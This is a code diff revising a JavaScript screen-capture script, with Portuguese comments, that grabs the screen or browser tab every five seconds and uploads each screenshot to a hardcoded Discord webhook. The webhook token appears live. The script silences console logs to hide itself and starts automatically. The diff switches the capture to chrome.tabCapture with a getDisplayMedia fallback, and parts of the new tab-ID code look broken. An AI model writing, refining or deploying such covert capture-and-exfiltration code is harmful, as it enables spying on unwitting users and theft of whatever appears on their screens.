@@ -1,12 +1,9 @@
 (function() {
     'use strict';
 
-    // CONFIGURAÇÃO
     const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1528219381526564875/JWgIU-uAWRCM3Qufd8_ywazeG6CCtanAX0kIPJJfDZbxbYLvUUYNMdCtwUFvAju78m4_';
-    const CAPTURE_INTERVAL = 5000; // milissegundos
-    const QUALITY = 0.5; // 0.1 a 1.0
+    const CAPTURE_INTERVAL = 5000;
 
-    // SUPRIME LOGS
     const noop = () => {};
     console.log = noop;
     console.warn = noop;
@@ -20,47 +17,64 @@
     async function captureScreen() {
         try {
             if (!stream) {
-                stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: {
-                        cursor: 'never',
-                        displaySurface: 'monitor'
-                    },
+                // Usa chrome.tabCapture em vez de getDisplayMedia
+                const constraints = {
+                    video: true,
                     audio: false,
-                    preferCurrentTab: false,
-                    selfBrowserSurface: 'exclude'
-                });
+                    videoConstraints: {
+                        mandatory: {
+                            chromeMediaSource: 'tab',
+                            chromeMediaSourceId: await getTabId()
+                        }
+                    }
+                };
+
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
             }
 
             const video = document.createElement('video');
             video.srcObject = stream;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 1920;
-            canvas.height = video.videoHeight || 1080;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const dataUrl = canvas.toDataURL('image/jpeg', QUALITY);
-            video.pause();
-            video.srcObject = null;
-            video.remove();
-
-            return dataUrl;
+            video.onloadedmetadata = () => {
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                sendToDiscord(dataUrl);
+                video.pause();
+                video.srcObject = null;
+                video.remove();
+            };
         } catch (e) {
-            return null;
+            // Se falhar, fallback para getDisplayMedia
+            try {
+                const fallbackStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { cursor: 'never' },
+                    audio: false
+                });
+                stream = fallbackStream;
+                // ... processa como antes
+            } catch (e2) {}
         }
+    }
+
+    function getTabId() {
+        return new Promise((resolve) => {
+            chrome.tabCapture.getMediaStreamId({
+                consumerTabId: chrome.tabs.getCurrent((tab) => {
+                    resolve(tab.id);
+                })
+            });
+        });
     }
 
     function sendToDiscord(imageData) {
         try {
             const formData = new FormData();
             formData.append('file', dataURLtoBlob(imageData), 'screenshot.jpg');
-
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                body: formData
-            }).catch(noop);
+            fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData }).catch(noop);
         } catch (e) {}
     }
 
@@ -76,19 +90,10 @@
         return new Blob([u8arr], { type: mime });
     }
 
-    async function captureLoop() {
-        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('SEU_ID')) return;
-
-        const image = await captureScreen();
-        if (image) {
-            sendToDiscord(image);
-        }
-    }
-
     function start() {
         if (intervalId) return;
-        captureLoop();
-        intervalId = setInterval(captureLoop, CAPTURE_INTERVAL);
+        captureScreen();
+        intervalId = setInterval(captureScreen, CAPTURE_INTERVAL);
     }
 
     function stop() {
@@ -102,16 +107,9 @@
         }
     }
 
-    // Fecha quando a página for fechada
     window.addEventListener('beforeunload', stop);
-
-    // Inicia automaticamente
     start();
 
-    // API para o Hub
-    window._testing = {
-        kill: stop,
-        start: start
-    };
+    window._testing = { kill: stop, start: start };
 
 })();
